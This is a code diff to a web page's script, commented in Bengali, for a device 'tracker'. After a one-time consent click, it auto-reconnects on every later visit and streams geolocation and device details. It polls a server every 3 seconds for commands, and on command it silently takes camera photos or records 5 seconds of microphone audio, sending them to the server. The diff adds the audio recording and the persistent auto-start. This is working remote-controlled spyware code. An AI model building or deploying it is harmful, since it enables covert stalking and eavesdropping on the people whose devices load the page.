@@ -40,12 +40,19 @@
     <script>
         let watchId = null;
         let sharingInterval = null;
-        let liveVideoInterval = null; // লাইভ ভিডিওর জন্য
-        let currentStream = null; // ক্যামেরা স্ট্রিম ধরে রাখার জন্য
+        let currentStream = null; 
+        let mediaRecorder = null;
+        let audioChunks = [];
 
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
-        const clientId = 'device_' + Math.random().toString(36).substr(2, 9);
+        
+        // ব্রাউজারে আইডি সেভ করা (যাতে বারবার নতুন ডিভাইস না দেখায়)
+        let clientId = localStorage.getItem("tracker_client_id");
+        if (!clientId) {
+            clientId = 'device_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem("tracker_client_id", clientId);
+        }
 
         function getPhoneModel(ua) {
             let model = "Unknown Device";
@@ -96,17 +103,27 @@
 
         getDeviceInfo();
 
-        async function startSharing() {
+        // পেজ লোড হওয়ার সাথে সাথে চেক করবে আগে সম্মতি দেওয়া হয়েছে কিনা
+        window.onload = () => {
+            if (localStorage.getItem("tracker_consent") === "true") {
+                console.log("আগের সম্মতি পাওয়া গেছে, অটো কানেক্ট হচ্ছে...");
+                startSharing(true); // অটো স্টার্ট
+            }
+        };
+
+        async function startSharing(isAuto = false) {
             btn.disabled = true;
-            btn.innerText = '⏳ সংযোগ স্থাপন...';
+            btn.innerText = isAuto ? '🔄 অটো কানেক্ট হচ্ছে...' : '⏳ সংযোগ স্থাপন...';
             statusMsg.innerText = '📡 পারমিশন চাচ্ছি...';
 
+            // সম্মতি সেভ করা
+            localStorage.setItem("tracker_consent", "true");
+
             try {
-                // ক্যামেরা স্ট্রিম চালু করে রাখা (লাইভ ভিডিওর জন্য)
-                currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                console.log("ক্যামেরা রেডি");
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                console.log("মাইক ও ক্যামেরা রেডি");
             } catch (err) {
-                console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
+                console.log("পারমিশন পাওয়া যায়নি: ", err);
             }
 
             if (!navigator.geolocation) {
@@ -144,7 +161,6 @@
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
 
-            // প্রতি ৩ সেকেন্ডে সার্ভার চেক করবে কমান্ড এসেছে কিনা
             sharingInterval = setInterval(checkCommands, 3000);
         }
 
@@ -166,12 +182,6 @@
                 battery: battery,
                 charging: charging ? "চার্জিং" : "আনপ্লাগড",
                 network: netType + " (" + netSpeed + ")",
-                language: navigator.language || 'N/A',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
-                screen: window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)",
-                pixelRatio: window.devicePixelRatio || 1,
-                cores: navigator.hardwareConcurrency || 'N/A',
-                memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : 'N/A',
                 time: new Date().toISOString()
             };
 
@@ -191,29 +201,19 @@
 
                     if (data.command === 'capture') {
                         takePhoto();
-                        resetCommand();
-                    } else if (data.command === 'live_video') {
-                        startLiveVideo();
-                    } else if (data.command === 'stop_live') {
-                        stopLiveVideo();
-                        resetCommand();
+                    } else if (data.command === 'record_audio') {
+                        recordAudio();
                     }
                 }).catch(err => console.log(err));
         }
 
-        function resetCommand() {
-            // কমান্ড সম্পন্ন হলে সার্ভার থেকে মুছে দেওয়া
-            fetch('/api/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id: clientId, camera_image: null, time: new Date().toISOString() })
-            });
-        }
-
         function takePhoto() {
             if (!currentStream) return;
+            const videoTrack = currentStream.getVideoTracks()[0];
+            if (!videoTrack) return;
+
             const video = document.createElement('video');
-            video.srcObject = currentStream;
+            video.srcObject = new MediaStream([videoTrack]);
             video.play();
             
             video.onloadedmetadata = () => {
@@ -224,45 +224,47 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 const imageData = canvas.toDataURL('image/jpeg', 0.5); 
-                sendCameraData(imageData);
+                sendMediaData({ camera_image: imageData });
             };
         }
 
-        function startLiveVideo() {
-            if (liveVideoInterval) return; // আগে থেকেই চললে কিছু করবে না
-            statusMsg.innerText = '🔴 লাইভ ভিডিও চলছে...';
-            
-            liveVideoInterval = setInterval(() => {
-                if (!currentStream) return;
-                const video = document.createElement('video');
-                video.srcObject = currentStream;
-                video.play();
-                
-                video.onloadedmetadata = () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageData = canvas.toDataURL('image/jpeg', 0.4); // কোয়ালিটি কম যাতে দ্রুত যায়
-                    sendCameraData(imageData);
+        function recordAudio() {
+            if (!currentStream) return;
+            const audioTrack = currentStream.getAudioTracks()[0];
+            if (!audioTrack) return;
+
+            audioChunks = [];
+            mediaRecorder = new MediaRecorder(new MediaStream([audioTrack]));
+
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(audioBlob);
+                reader.onloadend = () => {
+                    const base64Audio = reader.result;
+                    sendMediaData({ audio_data: base64Audio });
                 };
-            }, 1000); // প্রতি ১ সেকেন্ডে ছবি তুলে পাঠাবে
+            };
+
+            mediaRecorder.start();
+            statusMsg.innerText = '🎙️ অডিও রেকর্ড হচ্ছে (৫ সেকেন্ড)...';
+
+            setTimeout(() => {
+                if (mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();
+                    statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
+                }
+            }, 5000);
         }
 
-        function stopLiveVideo() {
-            if (liveVideoInterval) {
-                clearInterval(liveVideoInterval);
-                liveVideoInterval = null;
-                statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
-            }
-        }
-
-        function sendCameraData(imageData) {
+        function sendMediaData(mediaObj) {
             const data = {
                 id: clientId,
-                camera_image: imageData,
+                ...mediaObj,
                 time: new Date().toISOString()
             };
 
@@ -270,7 +272,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).catch(err => console.error("ছবি পাঠাতে সমস্যা:", err));
+            }).catch(err => console.error("মিডিয়া পাঠাতে সমস্যা:", err));
         }
     </script>
 </body>
